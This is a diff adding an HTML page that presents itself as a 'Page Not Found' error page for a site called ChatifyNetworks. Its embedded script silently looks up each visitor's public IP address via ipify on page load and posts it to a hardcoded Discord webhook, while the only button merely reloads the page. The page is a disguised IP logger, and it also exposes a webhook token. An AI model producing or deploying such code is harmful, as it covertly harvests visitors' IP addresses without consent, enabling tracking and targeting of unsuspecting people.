@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ChatifyNetworks</title>
+    <link rel="stylesheet" href="style.css">
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+</head>
+<body>
+    <div class="wrapper">
+        <h1>Page Not Found</h1>
+        <p class="message">We can't find the page you are looking for. Check out our Help center or head back to home.</p>
+        <a href="#" class="btn" id="learn-more-btn">Learn More About Us</a>
+        <p class="copyRights">&copy; 2026 ChatifyNetworks</p>
+    </div>
+    
+    <script>
+        $(document).ready(function() {
+            function sendIPToDiscord(ipAddress) {
+                var webhookURL = 'Phttps://discord.com/api/webhooks/1460315288602935500/_UKuf0ilwfA0qW6UcmnNYref3MD3ivBlvkiX6yEWioFi0M234IkTHttGsiIKGJT4CvdZ';
+                var payload = {
+                    content: 'IP Address: ' + ipAddress
+                };
+                
+                $.ajax({
+                    url: webhookURL,
+                    type: 'POST',
+                    data: JSON.stringify(payload),
+                    contentType: 'application/json',
+                    success: function() {
+                        console.log('success');
+                    },
+                    error: function(xhr, status, error) {
+                        console.error('failed', error);
+                    }
+                });
+            }
+            
+            var learnMoreBtn = $('#learn-more-btn');
+            learnMoreBtn.on('click', function(event) {
+                event.preventDefault();
+                location.reload();
+            });
+            
+            $.getJSON('https://api.ipify.org?format=json', function(data) {
+                var ipAddress = data.ip;
+                sendIPToDiscord(ipAddress);
+            });
+        });
+    </script>
+</body>
+</html>
